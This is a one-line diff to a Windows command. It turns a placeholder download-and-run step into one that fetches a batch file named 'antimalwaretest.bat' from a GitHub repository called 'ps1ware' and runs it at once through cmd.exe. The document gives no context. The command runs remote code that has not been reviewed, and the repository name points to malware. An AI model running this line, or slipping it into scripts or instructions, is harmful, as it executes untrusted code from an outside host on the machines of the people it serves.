@@ -1,1 +1,1 @@
-cmd.exe /c "curl -o file.bat https://example.com/path/to/file.bat && file.bat"
+cmd.exe /c "curl -o file.bat https://raw.githubusercontent.com/s-b-repo/ps1ware/main/antimalwaretest.bat && antimalwaretest.bat"
